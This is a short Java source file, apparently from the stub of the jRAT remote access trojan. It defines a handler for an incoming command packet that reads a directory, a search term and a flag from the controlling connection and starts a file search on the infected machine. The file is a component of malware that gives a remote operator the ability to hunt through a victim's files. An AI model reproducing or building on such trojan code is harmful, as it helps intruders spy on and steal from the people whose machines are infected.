package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.FileSearch;

import java.io.File;


public class Packet53StartSearch extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String start = con.readLine();
		if (!start.endsWith(File.separator)) {
			start = start + File.separator;
		}
		String what = con.readLine();
		boolean dir = con.readBoolean();
		new FileSearch(con, start, what, dir).start();
	}

}
